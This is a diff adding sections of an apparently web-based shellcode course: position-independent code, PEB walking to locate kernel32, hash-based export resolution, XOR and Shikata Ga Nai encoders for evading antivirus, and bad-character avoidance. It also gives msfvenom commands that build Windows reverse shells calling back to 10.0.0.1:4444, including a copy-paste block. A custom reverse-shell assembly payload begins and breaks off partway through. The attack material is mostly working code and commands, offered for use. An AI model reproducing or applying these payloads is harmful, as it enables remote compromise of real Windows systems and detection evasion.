+            <h3>5.1 The Problem: No Absolute Addresses</h3>
+            <div class="code-block">
+<span class="comment">; BAD: Hardcoded data address — fails when injected elsewhere</span>
+<span class="output">mov eax, 0x00403000       ; Data at fixed address in original EXE</span>
+<span class="output">push eax</span>
+<span class="output">call SomeFunction</span>
+
+<span class="comment">; GOOD: EIP-relative data access</span>
+<span class="output">call get_eip</span>
+<span class="output">get_eip:</span>
+<span class="output">    pop ebx               ; EBX = address of get_eip label</span>
+<span class="output">    lea eax, [ebx + data - get_eip]  ; EAX = address of data</span>
+<span class="output">    ...</span>
+<span class="output">data:</span>
+<span class="output">    db "Hello", 0</span>
+            </div>
+
+            <h3>5.2 The call/pop Technique</h3>
+            <p>The most common PIC technique in shellcode: <span class="neon-highlight">call</span> pushes the return address (which is the address of the next instruction) onto the stack. <span class="neon-highlight">pop</span> retrieves it into a register. This gives you the current EIP without needing to read it directly (which requires special instructions).</p>
+
+            <div class="code-block">
+<span class="comment">; Classic call/pop to get EIP</span>
+<span class="output">    call get_eip          ; Pushes address of 'pop ebx' onto stack</span>
+<span class="output">get_eip:</span>
+<span class="output">    pop ebx               ; EBX = address of get_eip</span>
+<span class="output">    ; Now EBX is our base. All data offsets are relative to EBX.</span>
+<span class="output">    lea esi, [ebx + string1 - get_eip]</span>
+<span class="output">    lea edi, [ebx + string2 - get_eip]</span>
+<span class="output">    ...</span>
+<span class="output">string1: db "kernel32", 0</span>
+<span class="output">string2: db "LoadLibraryA", 0</span>
+            </div>
+
+            <h3>5.3 x64 RIP-Relative Addressing</h3>
+            <p>x64 has native RIP-relative addressing, making PIC easier. You can reference data directly relative to the instruction pointer without tricks.</p>
+
+            <div class="code-block">
+<span class="comment">; x64: RIP-relative addressing (no call/pop needed)</span>
+<span class="output">    lea rcx, [rel message]    ; RCX = address of message</span>
+<span class="output">    call printf</span>
+<span class="output">    ...</span>
+<span class="output">message: db "Hello World", 0</span>
             </div>
 
             <div class="why-box">
-                <h5>Why the PEB is reliable</h5>
-                <p>The Process Environment Block is a Windows kernel structure that exists for every process. Its location is predictable (fs:[0x30] on x86, gs:[0x60] on x64). The module list inside it contains every loaded DLL with its base address. By walking this list, shellcode can find kernel32.dll, then parse its export table to find LoadLibraryA, GetProcAddress, and any other API — all without hardcoded addresses.</p>
+                <h5>Why PIC is mandatory for shellcode</h5>
+                <p>When you inject shellcode via <span class="neon-highlight">VirtualAllocEx</span> + <span class="neon-highlight">WriteProcessMemory</span>, the target address is determined by the OS. It could be anywhere in the 2-4GB user-mode address space. If your shellcode references absolute addresses, it will access random memory and crash. PIC ensures your code works regardless of where it lands.</p>
             </div>
         </div>
 
+        <!-- SECTION 06: PEB WALKING -->
         <div class="section">
-            <span class="section-number">SECTION 04</span>
-            <h2>Lab Exercise: Build and Test Shellcode</h2>
-            <p>Write shellcode that opens notepad.exe. Test it in a controlled environment.</p>
+            <span class="section-number">SECTION 06</span>
+            <h2>PEB Walking: Finding kernel32.dll Without Hardcoded Addresses</h2>
+            <p>The Process Environment Block (PEB) is a Windows kernel structure that exists for every process. It contains the loaded module list, heap info, command line, and other process metadata. Most importantly, it contains the <span class="neon-highlight">Ldr</span> structure, which lists every loaded DLL with its base address. By walking this list, shellcode can find kernel32.dll dynamically — no hardcoded addresses needed.</p>
 
+            <div class="soldier-box">
+                <p>The PEB is like a directory inside the enemy headquarters. It lists every unit (DLL) stationed there, where they are billeted (base address), and what equipment they have (exported functions). You don't need to know the address of the armory in advance; you just look it up in the directory. The directory is always in the same place: FS:[0x30] on x86, GS:[0x60] on x64.</p>
+            </div>
+
+            <h3>6.1 PEB Structure Overview</h3>
+            <div class="code-block">
+<span class="comment">; PEB structure (simplified, offsets stable since Windows NT)</span>
+<span class="output">; FS:[0x30] (x86) or GS:[0x60] (x64) → PEB*</span>
+<span class="output">;</span>
+<span class="output">; PEB + 0x00  = InheritedAddressSpace</span>
+<span class="output">; PEB + 0x0C  = Ldr*  (PEB_LDR_DATA)</span>
+<span class="output">; PEB + 0x1E  = BeingDebugged</span>
+<span class="output">; PEB + 0x40  = ImageBaseAddress (x64: +0x10)</span>
+<span class="output">;</span>
+<span class="output">; PEB_LDR_DATA + 0x14 = InMemoryOrderModuleList (x86)</span>
+<span class="output">; PEB_LDR_DATA + 0x20 = InMemoryOrderModuleList (x64)</span>
+            </div>
+
+            <h3>6.2 Walking the Module List</h3>
+            <p>The <span class="neon-highlight">InMemoryOrderModuleList</span> is a doubly-linked list of <span class="neon-highlight">LDR_DATA_TABLE_ENTRY</span> structures. Each entry represents a loaded DLL. The list order is typically: executable, ntdll.dll, kernel32.dll, kernelbase.dll, ...</p>
+
+            <div class="code-block">
+<span class="comment">; x86 PEB walking to find kernel32.dll base</span>
+<span class="output">    xor eax, eax</span>
+<span class="output">    mov eax, fs:[eax+0x30]    ; EAX = PEB</span>
+<span class="output">    mov eax, [eax+0x0C]       ; EAX = PEB->Ldr</span>
+<span class="output">    mov eax, [eax+0x14]       ; EAX = InMemoryOrderModuleList (first entry)</span>
+<span class="output">    mov eax, [eax]            ; EAX = second entry (ntdll.dll)</span>
+<span class="output">    mov eax, [eax]            ; EAX = third entry (kernel32.dll)</span>
+<span class="output">    mov ebx, [eax+0x10]       ; EBX = kernel32.dll base address</span>
+<span class="output">    ; EBX now points to the base of kernel32.dll</span>
+            </div>
+
+            <div class="code-block">
+<span class="comment">; x64 PEB walking to find kernel32.dll base</span>
+<span class="output">    xor rdx, rdx</span>
+<span class="output">    mov rax, gs:[rdx+0x60]    ; RAX = PEB</span>
+<span class="output">    mov rax, [rax+0x18]       ; RAX = PEB->Ldr</span>
+<span class="output">    mov rax, [rax+0x20]       ; RAX = InMemoryOrderModuleList</span>
+<span class="output">    mov rax, [rax]            ; ntdll.dll</span>
+<span class="output">    mov rax, [rax]            ; kernel32.dll</span>
+<span class="output">    mov rbx, [rax+0x20]       ; RBX = kernel32.dll base address (x64 offset)</span>
+            </div>
+
+            <h3>6.3 Why This Bypasses ASLR</h3>
+            <p>Address Space Layout Randomization (ASLR) randomizes DLL base addresses on every reboot. But the PEB is always at a predictable offset from the segment register (FS/GS). The module list inside the PEB always contains the actual, current base addresses. By reading the PEB at runtime, shellcode gets the correct address regardless of randomization. This is the fundamental ASLR bypass technique used in virtually all modern Windows shellcode.</p>
+
+            <div class="why-box">
+                <h5>Why the PEB is reliable across Windows versions</h5>
+                <p>The PEB structure offsets have been stable since Windows NT 4.0. Microsoft cannot change them without breaking compatibility with thousands of applications. The FS:[0x30] / GS:[0x60] pointer, the Ldr offset (+0x0C x86 / +0x18 x64), and the module list entry offsets are effectively frozen in the Windows ABI. This makes PEB walking one of the most reliable techniques in shellcode.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 07: EXPORT TABLE PARSING -->
+        <div class="section">
+            <span class="section-number">SECTION 07</span>
+            <h2>Export Table Parsing: Finding APIs by Name</h2>
+            <p>Once you have a DLL's base address (from PEB walking), you need to find the address of a specific exported function (e.g., LoadLibraryA, WinExec, CreateProcessA). The PE (Portable Executable) format stores this information in the Export Directory. By parsing this structure manually, shellcode can resolve any API without calling GetProcAddress — which itself must first be found.</p>
+
+            <h3>7.1 PE Format Overview</h3>
+            <div class="code-block">
+<span class="comment">; PE format: DOS Header → PE Signature → COFF Header → Optional Header → Data Directories</span>
+<span class="output">; DOS Header (64 bytes):</span>
+<span class="output">;   +0x00  e_magic = "MZ"</span>
+<span class="output">;   +0x3C  e_lfanew = offset to PE signature</span>
+<span class="output">;</span>
+<span class="output">; PE Signature (4 bytes): "PE\0\0"</span>
+<span class="output">;</span>
+<span class="output">; COFF Header (20 bytes): machine type, section count, etc.</span>
+<span class="output">;</span>
+<span class="output">; Optional Header:</span>
+<span class="output">;   +0x18  (x86) / +0x20 (x64)  AddressOfEntryPoint</span>
+<span class="output">;   +0x60  (x86) / +0x70 (x64)  DataDirectory[0] = Export Directory</span>
+<span class="output">;   DataDirectory = { VirtualAddress, Size }</span>
+            </div>
+
+            <h3>7.2 Export Directory Structure</h3>
+            <div class="code-block">
+<span class="comment">; IMAGE_EXPORT_DIRECTORY structure:</span>
+<span class="output">;   +0x00  Characteristics</span>
+<span class="output">;   +0x04  TimeDateStamp</span>
+<span class="output">;   +0x08  MajorVersion / MinorVersion</span>
+<span class="output">;   +0x0C  Name (RVA of DLL name string)</span>
+<span class="output">;   +0x10  Base (ordinal base)</span>
+<span class="output">;   +0x14  NumberOfFunctions</span>
+<span class="output">;   +0x18  NumberOfNames</span>
+<span class="output">;   +0x1C  AddressOfFunctions     (RVA array of function addresses)</span>
+<span class="output">;   +0x20  AddressOfNames         (RVA array of name string RVAs)</span>
+<span class="output">;   +0x24  AddressOfNameOrdinals  (array of ordinals, parallel to names)</span>
+            </div>
+
+            <h3>7.3 Manual Export Parsing Algorithm</h3>
+            <div class="code-block">
+<span class="comment">; Algorithm to find LoadLibraryA in kernel32.dll:</span>
+<span class="output">; 1. Get kernel32.dll base from PEB (EBX)</span>
+<span class="output">; 2. Read DOS header: EBX + 0x3C = PE header offset</span>
+<span class="output">; 3. Read Optional Header: PE + 0x18 (x86) = Optional Header</span>
+<span class="output">; 4. Read DataDirectory[0]: OptHeader + 0x60 = Export Directory RVA</span>
+<span class="output">; 5. Export Directory VA = EBX + ExportDirectoryRVA</span>
+<span class="output">; 6. NumberOfNames = [ExportDir + 0x18]</span>
+<span class="output">; 7. AddressOfNames = EBX + [ExportDir + 0x20]</span>
+<span class="output">; 8. AddressOfNameOrdinals = EBX + [ExportDir + 0x24]</span>
+<span class="output">; 9. AddressOfFunctions = EBX + [ExportDir + 0x1C]</span>
+<span class="output">; 10. Loop through names, compare to "LoadLibraryA"</span>
+<span class="output">; 11. On match: ordinal = AddressOfNameOrdinals[index]</span>
+<span class="output">; 12. Function address = EBX + AddressOfFunctions[ordinal]</span>
+            </div>
+
+            <h3>7.4 Assembly Implementation</h3>
+            <div class="code-block">
+<span class="comment">; x86 assembly: find LoadLibraryA by hash (common shellcode technique)</span>
+<span class="comment">; Instead of comparing full strings, many shellcodes use 4-byte hashes</span>
+<span class="comment">; This saves space and avoids storing long strings in the payload</span>
+
+<span class="output">find_function:</span>
+<span class="output">    pushad                    ; Save all registers</span>
+<span class="output">    mov ebp, [esp + 0x24]     ; EBP = DLL base</span>
+<span class="output">    mov eax, [ebp + 0x3C]     ; EAX = PE header offset</span>
+<span class="output">    mov edx, [ebp + eax + 0x78]; EDX = Export Directory RVA</span>
+<span class="output">    add edx, ebp              ; EDX = Export Directory VA</span>
+<span class="output">    mov ecx, [edx + 0x18]     ; ECX = NumberOfNames</span>
+<span class="output">    mov ebx, [edx + 0x20]     ; EBX = AddressOfNames RVA</span>
+<span class="output">    add ebx, ebp              ; EBX = AddressOfNames VA</span>
+
+<span class="output">find_function_loop:</span>
+<span class="output">    jecxz find_function_finished</span>
+<span class="output">    dec ecx                   ; ECX = index into names array</span>
+<span class="output">    mov esi, [ebx + ecx*4]    ; ESI = name RVA</span>
+<span class="output">    add esi, ebp              ; ESI = name VA</span>
+<span class="output">    call compute_hash         ; Compute hash of function name</span>
+<span class="output">    cmp eax, [esp + 0x28]     ; Compare to target hash</span>
+<span class="output">    jnz find_function_loop    ; No match, try next</span>
+
+<span class="output">    ; Found it! Get function address</span>
+<span class="output">    mov ebx, [edx + 0x24]     ; EBX = AddressOfNameOrdinals RVA</span>
+<span class="output">    add ebx, ebp              ; EBX = AddressOfNameOrdinals VA</span>
+<span class="output">    mov cx, [ebx + ecx*2]     ; CX = ordinal</span>
+<span class="output">    mov ebx, [edx + 0x1C]     ; EBX = AddressOfFunctions RVA</span>
+<span class="output">    add ebx, ebp              ; EBX = AddressOfFunctions VA</span>
+<span class="output">    mov eax, [ebx + ecx*4]    ; EAX = function RVA</span>
+<span class="output">    add eax, ebp              ; EAX = function VA</span>
+<span class="output">    mov [esp + 0x1C], eax     ; Overwrite EAX in pushad stack</span>
+
+<span class="output">find_function_finished:</span>
+<span class="output">    popad                     ; Restore registers (EAX = function addr)</span>
+<span class="output">    ret 0x08                  ; Clean up hash argument</span>
+            </div>
+
+            <div class="why-box">
+                <h5>Why hashing is used instead of string comparison</h5>
+                <p>Storing full strings like "LoadLibraryA\0" (13 bytes) plus "GetProcAddress\0" (15 bytes) increases shellcode size significantly. A 4-byte hash of the name is much smaller. The hash function (often a simple ROR+ADD loop) is computed at runtime and compared against the precomputed hash embedded in the shellcode. This technique, popularized by Metasploit, reduces shellcode size by 50% or more.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 08: SHELLCODE ENCODING -->
+        <div class="section">
+            <span class="section-number">SECTION 08</span>
+            <h2>Shellcode Encoding: Hiding the Payload</h2>
+            <p>Raw shellcode is a signature. Antivirus engines, IDS/IPS systems, and EDR products maintain databases of known shellcode byte sequences. Encoding transforms the shellcode into a different byte sequence that decodes itself at runtime. The decoder stub is small; the encoded payload is unrecognizable to signature-based detection.</p>
+
+            <div class="soldier-box">
+                <p>Encoding is like writing a message in invisible ink. The paper (the payload) looks blank to the enemy (AV), but when heated (executed), the message appears. The decoder is the match — small, simple, and hard to detect on its own. The encoded payload is just noise until the decoder runs.</p>
+            </div>
+
+            <h3>8.1 XOR Encoding</h3>
+            <p>The simplest and most common encoding. Every byte of the payload is XORed with a single-byte key (or multi-byte key). The decoder stub XORs the payload back to original form in memory, then jumps to it. XOR is reversible: A XOR B XOR B = A.</p>
+
+            <div class="code-block">
+<span class="comment">; XOR decoder stub (x86, single-byte key 0xAA)</span>
+<span class="output">    jmp short call_decoder</span>
+<span class="output">decoder:</span>
+<span class="output">    pop esi                   ; ESI = address of encoded payload</span>
+<span class="output">    mov ecx, payload_len      ; ECX = number of bytes to decode</span>
+<span class="output">    xor eax, eax              ; EAX = 0</span>
+<span class="output">decode_loop:</span>
+<span class="output">    xor byte [esi + eax], 0xAA</span>
+<span class="output">    inc eax</span>
+<span class="output">    cmp eax, ecx</span>
+<span class="output">    jne decode_loop</span>
+<span class="output">    jmp esi                   ; Jump to decoded payload</span>
+<span class="output">call_decoder:</span>
+<span class="output">    call decoder</span>
+<span class="output">    ; Encoded payload bytes follow here</span>
+<span class="output">    db 0x9B, 0x6A, 0xC2, ...  ; XOR-encoded shellcode</span>
+            </div>
+
+            <h3>8.2 Shikata Ga Nai (Metasploit)</h3>
+            <p>Shikata Ga Nai (Japanese: "it cannot be helped") is Metasploit's polymorphic XOR additive feedback encoder. It is not a simple XOR loop — it uses dynamic instruction substitution, register randomization, and chained decoding. Each encoding produces a different byte sequence, defeating simple signature detection.</p>
+
+            <div class="code-block">
+<span class="comment">; Shikata Ga Nai characteristics:</span>
+<span class="comment">; - Polymorphic: different encoding every time</span>
+<span class="comment">; - Dynamic: decoder stub changes registers and instructions</span>
+<span class="comment">; - FPU instructions: uses floating-point ops to get EIP (evades heuristics)</span>
+<span class="comment">; - Chained: decoder decodes the next layer, which decodes the next, etc.</span>
+<span class="output">;</span>
+<span class="output">; Example msfvenom command:</span>
+<span class="output">; msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \</span>
+<span class="output">;   -e x86/shikata_ga_nai -i 5 -f c</span>
+<span class="output">;   -i 5 = encode 5 times (5 layers of encoding)</span>
+            </div>
+
+            <h3>8.3 Other Encoders</h3>
+            <table>
+                <tr><th>Encoder</th><th>Type</th><th>Best For</th></tr>
+                <tr><td><span class="neon-highlight">x86/shikata_ga_nai</span></td><td>Polymorphic XOR</td><td>General purpose, high evasion</td></tr>
+                <tr><td><span class="neon-highlight">x86/xor</span></td><td>Static XOR</td><td>Speed, simplicity</td></tr>
+                <tr><td><span class="neon-highlight">x86/countdown</span></td><td>XOR with countdown</td><td>Small payloads</td></tr>
+                <tr><td><span class="neon-highlight">x86/fnstenv_mov</span></td><td>FPU-based EIP</td><td>Getting EIP without call/jmp</td></tr>
+                <tr><td><span class="neon-highlight">x86/alpha_mixed</span></td><td>Alpha-numeric</td><td>Restrictive input (e.g., buffer filters)</td></tr>
+                <tr><td><span class="neon-highlight">x86/unicode_mixed</span></td><td>Unicode-safe</td><td>Unicode translation paths</td></tr>
+            </table>
+
+            <div class="warning-box">
+                <h5>⚠ Encoding is not encryption</h5>
+                <p>Encoding transforms bytes to evade signatures. It does not provide confidentiality. Anyone with the key (or who captures the payload in memory after decoding) can recover the original shellcode. For true protection, use encryption (e.g., AES) with a key delivered separately. However, encrypted payloads require a decryption routine, which itself may be detected.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 09: NULL BYTE AVOIDANCE -->
+        <div class="section">
+            <span class="section-number">SECTION 09</span>
+            <h2>Null Byte Avoidance: The Invisible Killer</h2>
+            <p>Null bytes (0x00) terminate C strings. Many injection vectors — buffer overflows, format strings, URL parameters — treat 0x00 as the end of input. If your shellcode contains a null byte, it may be truncated before reaching memory. Avoiding null bytes is one of the oldest and most important shellcode constraints.</p>
+
+            <h3>9.1 Why Null Bytes Break Shellcode</h3>
+            <div class="code-block">
+<span class="comment">; Vulnerable C code:</span>
+<span class="output">char buffer[256];</span>
+<span class="output">strcpy(buffer, user_input);  // Stops at first null byte!</span>
+<span class="output">;</span>
+<span class="comment">; If user_input contains shellcode with 0x00,</span>
+<span class="comment">; strcpy copies only up to the null. The rest is lost.</span>
+<span class="comment">; The exploit fails because the payload is incomplete.</span>
+            </div>
+
+            <h3>9.2 Null-Free Alternatives</h3>
+            <table>
+                <tr><th>Operation</th><th>With Nulls (BAD)</th><th>Null-Free (GOOD)</th></tr>
+                <tr><td>Zero EAX</td><td>mov eax, 0 → B8 00 00 00 00</td><td>xor eax, eax → 31 C0</td></tr>
+                <tr><td>Zero ECX</td><td>mov ecx, 0 → B9 00 00 00 00</td><td>xor ecx, ecx → 31 C9</td></tr>
+                <tr><td>EAX = 1</td><td>mov eax, 1 → B8 01 00 00 00</td><td>xor eax, eax / inc eax → 31 C0 / 40</td></tr>
+                <tr><td>Push 0</td><td>push 0 → 6A 00</td><td>xor eax, eax / push eax → 31 C0 / 50</td></tr>
+                <tr><td>Large value</td><td>mov eax, 0x7C8623AD</td><td>xor eax, eax / mov ax, 0x23AD / shl eax, 16 / mov ax, 0x7C86</td></tr>
+            </table>
+
+            <h3>9.3 Building Null-Free Strings on the Stack</h3>
+            <div class="code-block">
+<span class="comment">; BAD: Push "calc.exe" with null terminator — contains 0x00</span>
+<span class="output">push 0x6578652e           ; "exe\0" — null byte in the high byte!</span>
+<span class="output">push 0x636c6163           ; "calc"</span>
+
+<span class="comment">; GOOD: Build string without nulls, then write null separately</span>
+<span class="output">xor eax, eax              ; EAX = 0 (no nulls in instruction)</span>
+<span class="output">push eax                  ; Push null terminator (0x00 from register)</span>
+<span class="output">push 0x6578652e           ; "exe." (no null — note: little endian)</span>
+<span class="output">push 0x636c6163           ; "calc"</span>
+<span class="output">mov ebx, esp              ; EBX points to "calc.exe\0"</span>
+            </div>
+
+            <div class="why-box">
+                <h5>Why null bytes are still relevant in 2024</h5>
+                <p>Modern exploit mitigations (ASLR, DEP, stack canaries) have made simple stack overflows rare. But null byte avoidance remains critical for:</p>
+                <ul>
+                    <li>URL-encoded payloads (0x00 terminates the parameter)</li>
+                    <li>String-based protocols (HTTP headers, SMTP, FTP)</li>
+                    <li>File format exploits (PDF, Office) where strings are parsed</li>
+                    <li>JSON/XML injection where 0x00 is invalid</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- SECTION 10: BAD CHARACTER ANALYSIS -->
+        <div class="section">
+            <span class="section-number">SECTION 10</span>
+            <h2>Bad Character Analysis: Know Your Constraints</h2>
+            <p>Beyond null bytes, different injection vectors forbid different characters. A bad character is any byte that breaks your delivery mechanism. Common bad characters include null (0x00), newline (0x0A, 0x0D), space (0x20), and characters with special meaning in the target protocol (e.g., &lt;, &gt;, &amp; in XML; \x in regex; % in URL encoding).</p>
+
+            <h3>10.1 Common Bad Character Sets</h3>
+            <table>
+                <tr><th>Vector</th><th>Bad Characters</th><th>Reason</th></tr>
+                <tr><td><span class="neon-highlight">strcpy overflow</span></td><td>0x00</td><td>String terminator</td></tr>
+                <tr><td><span class="neon-highlight">HTTP GET parameter</span></td><td>0x00, 0x20, 0x26, 0x3D</td><td>Null, space, &, = have special meaning</td></tr>
+                <tr><td><span class="neon-highlight">Base64 encoding</span></td><td>Non-alphanumeric + / =</td><td>Base64 alphabet restriction</td></tr>
+                <tr><td><span class="neon-highlight">Unicode conversion</span></td><td>0x80-0xFF (depends on codepage)</td><td>May be expanded to 2 bytes</td></tr>
+                <tr><td><span class="neon-highlight">JSON value</span></td><td>0x00, 0x22, 0x5C</td><td>Null, quote, backslash are escaped</td></tr>
+                <tr><td><span class="neon-highlight">XML/CDATA</span></td><td>0x00, 0x3C, 0x3E, 0x26</td><td>Null, <, >, & are special</td></tr>
+                <tr><td><span class="neon-highlight">Terminal input</span></td><td>0x00, 0x03, 0x04, 0x1A</td><td>Control characters (Ctrl+C, Ctrl+D, Ctrl+Z)</td></tr>
+            </table>
+
+            <h3>10.2 Identifying Bad Characters</h3>
+            <p>The standard technique is to send a payload containing all 256 bytes (0x00-0xFF) and observe which ones are truncated, modified, or rejected. The surviving bytes are your allowed character set.</p>
+
+            <div class="code-block">
+<span class="comment">; Python script to generate a bad character test string</span>
+<span class="output">badchars = bytes(range(256))</span>
+<span class="output"># Send this as your payload, then check memory to see which bytes arrived intact</span>
+<span class="output"># Missing bytes at the end = truncation point</span>
+<span class="output"># Modified bytes = transformation (e.g., uppercase conversion)</span>
+<span class="output"># Missing bytes in the middle = specific bad chars</span>
+            </div>
+
+            <h3>10.3 Working Around Bad Characters</h3>
+            <p>Once you know your bad character set, you have several options:</p>
+            <ul>
+                <li><strong>Encoder selection:</strong> Use an msfvenom encoder that avoids your bad chars (e.g., <span class="neon-highlight">-b '\x00\x0a\x0d'</span>)</li>
+                <li><strong>Custom encoding:</strong> Write your own encoder that only uses allowed bytes</li>
+                <li><strong>Alpha-numeric shellcode:</strong> Restrict payload to 0x30-0x39, 0x41-0x5A, 0x61-0x7A — works in almost any string context</li>
+                <li><strong>Staged payload:</strong> Use a tiny first stage that downloads and executes a larger second stage</li>
+            </ul>
+
+            <div class="warning-box">
+                <h5>⚠ Always test bad characters in the actual target</h5>
+                <p>Never assume bad characters based on documentation alone. Firewalls, WAFs, and application-level filters may modify your payload in unexpected ways. The only reliable method is to send a test payload and inspect the result in a debugger or memory dump.</p>
+            </div>
+        </div>
+
+        <!-- SECTION 11: MSFVENOM USAGE -->
+        <div class="section">
+            <span class="section-number">SECTION 11</span>
+            <h2>msfvenom: The Shellcode Factory</h2>
+            <p>msfvenom is the payload generation tool from the Metasploit Framework. It can generate shellcode in dozens of formats, apply encoders, avoid bad characters, and output to C, Python, PowerShell, raw binary, and more. It is the standard tool for rapid shellcode prototyping and production.</p>
+
+            <div class="soldier-box">
+                <p>msfvenom is like an armory. You don't forge your own sword every time; you pick the right weapon for the mission, customize it, and deploy it. The armory has swords (bind shells), daggers (reverse shells), bows (staged payloads), and poison (encoded payloads). You choose the tool, the target, and the delivery method — msfvenom builds it.</p>
+            </div>
+
+            <h3>11.1 Basic msfvenom Commands</h3>
+            <div class="code-block">
+<span class="comment"># List available payloads</span>
+<span class="prompt">$</span> <span class="output">msfvenom --list payloads | grep windows</span>
+
+<span class="comment"># Generate a Windows reverse TCP shell (raw bytes)</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shellcode.bin</span>
+
+<span class="comment"># Generate with C array output</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c</span>
+
+<span class="comment"># Generate with Python output</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f python</span>
+
+<span class="comment"># Generate PowerShell one-liner</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh-cmd</span>
+            </div>
+
+            <h3>11.2 Encoding and Bad Character Avoidance</h3>
+            <div class="code-block">
+<span class="comment"># Encode with Shikata Ga Nai, 5 iterations</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \</span>
+<span class="output">  -e x86/shikata_ga_nai -i 5 -f c</span>
+
+<span class="comment"># Avoid specific bad characters (null, newline, carriage return)</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \</span>
+<span class="output">  -b '\x00\x0a\x0d' -f c</span>
+
+<span class="comment"># Combine encoding and bad character avoidance</span>
+<span class="prompt">$</span> <span class="output">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \</span>
+<span class="output">  -e x86/shikata_ga_nai -i 3 -b '\x00\x0a\x0d\x20' -f c</span>
+
+<span class="comment"># List available encoders</span>
+<span class="prompt">$</span> <span class="output">msfvenom --list encoders</span>
+            </div>
+
+            <h3>11.3 Common Payload Types</h3>
+            <table>
+                <tr><th>Payload</th><th>Type</th><th>Use Case</th></tr>
+                <tr><td><span class="neon-highlight">windows/shell_reverse_tcp</span></td><td>Stageless reverse shell</td><td>Direct connection back to attacker</td></tr>
+                <tr><td><span class="neon-highlight">windows/shell/bind_tcp</span></td><td>Stageless bind shell</td><td>Listen on target, attacker connects</td></tr>
+                <tr><td><span class="neon-highlight">windows/meterpreter/reverse_tcp</span></td><td>Staged reverse Meterpreter</td><td>Full-featured post-exploitation</td></tr>
+                <tr><td><span class="neon-highlight">windows/exec</span></td><td>Execute command</td><td>Run a specific command (e.g., calc.exe)</td></tr>
+                <tr><td><span class="neon-highlight">windows/download_exec</span></td><td>Download and execute</td><td>Fetch payload from URL, run it</td></tr>
+                <tr><td><span class="neon-highlight">windows/x64/shell_reverse_tcp</span></td><td>x64 reverse shell</td><td>Modern 64-bit Windows targets</td></tr>
+            </table>
+
+            <h3>11.4 Output Formats</h3>
+            <div class="code-block">
+<span class="comment"># Common output formats:</span>
+<span class="output">-f raw      → Raw binary bytes</span>
+<span class="output">-f c        → C unsigned char array</span>
+<span class="output">-f python   → Python bytearray</span>
+<span class="output">-f psh      → PowerShell script</span>
+<span class="output">-f psh-cmd  → PowerShell one-liner for cmd.exe</span>
+<span class="output">-f exe      → Windows executable</span>
+<span class="output">-f dll      → Windows DLL</span>
+<span class="output">-f vbscript → VBScript</span>
+<span class="output">-f java     → Java byte array</span>
+<span class="output">-f hex      → Hex string</span>
+            </div>
+
+            <div class="copy-paste" onclick="copyToClipboard(this)">
+# Full msfvenom command with all options
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST=10.0.0.1 LPORT=4444 \
+  -e x86/shikata_ga_nai -i 5 \
+  -b '\x00\x0a\x0d\x20\x25\x26' \
+  -f c -o shellcode.c
+            </div>
+        </div>
+
+        <!-- SECTION 12: CUSTOM SHELLCODE -->
+        <div class="section">
+            <span class="section-number">SECTION 12</span>
+            <h2>Custom Shellcode: Building from Scratch</h2>
+            <p>msfvenom is powerful, but custom shellcode is smaller, stealthier, and more reliable. You control every byte. You know exactly what it does. You can tailor it to specific constraints (size, bad characters, target OS version). This section walks through building a complete custom shellcode payload.</p>
+
+            <h3>12.1 Design Goals</h3>
+            <p>Our custom shellcode will:</p>
+            <ul>
+                <li>Find kernel32.dll base via PEB walking</li>
+                <li>Parse kernel32.dll exports to find LoadLibraryA and GetProcAddress</li>
+                <li>Use LoadLibraryA to load ws2_32.dll (Winsock)</li>
+                <li>Use GetProcAddress to find WSASocketA, connect, and CreateProcessA</li>
+                <li>Spawn a reverse shell — all without hardcoded addresses</li>
+            </ul>
+
+            <h3>12.2 Step-by-Step Custom Build</h3>
+            <div class="code-block">
+<span class="comment">; Custom reverse shell shellcode (x86, position-independent)</span>
+<span class="comment">; Assemble: nasm -f bin reverse_shell.asm -o reverse_shell.bin</span>
+
+<span class="output">[BITS 32]</span>
+<span class="output">[ORG 0]</span>
+
+<span class="output">start:</span>
+<span class="output">    ; Step 1: Get EIP via call/pop</span>
+<span class="output">    call get_eip</span>
+<span class="output">get_eip:</span>
+<span class="output">    pop ebx                   ; EBX = base address of shellcode</span>
+<span class="output">    lea ebp, [ebx + api_hashes - get_eip]</span>
+<span class="output">    ; EBP now points to our API hash table</span>
+
+<span class="output">    ; Step 2: Find kernel32.dll base via PEB</span>
+<span class="output">    xor eax, eax</span>
+<span class="output">    mov eax, [fs:eax+0x30]    ; EAX = PEB</span>
+<span class="output">    mov eax, [eax+0x0C]       ; EAX = PEB->Ldr</span>
+<span class="output">    mov eax, [eax+0x14]       ; InMemoryOrderModuleList</span>
+<span class="output">    mov eax, [eax]            ; ntdll.dll</span>
+<span class="output">    mov eax, [eax]            ; kernel32.dll</span>
+<span class="output">    mov esi, [eax+0x10]       ; ESI = kernel32.dll base</span>
+
+<span class="output">    ; Step 3: Find LoadLibraryA by hash</span>
+<span class="output">    lodsd                     ; EAX = hash of LoadLibraryA</span>
+<span class="output">    push eax</span>
+<span class="output">    push esi                  ; kernel32 base</span>
+<span class="output">    call find_function</span>
+<span class="output">    mov [ebx + ll_addr - get_eip], eax</span>
+
+<span class="output">    ; Step 4: Find GetProcAddress by hash</span>
+<span class="output">    lodsd</span>
+<span class="output">    push eax</span>
+<span class="output">    push esi</span>
+<span class="output">    call find_function</span>
+<span class="output">    mov [ebx + gpa_addr - get_eip], eax</span>
+
+<span class="output">    ; Step 5: Load ws2_32.dll</span>
+<span class="output">    lea ecx, [ebx + ws2_32 - get_eip]</span>
+<span class="output">    push ecx</span>
+<span class="output">    call [ebx + ll_addr - get_eip]</span>
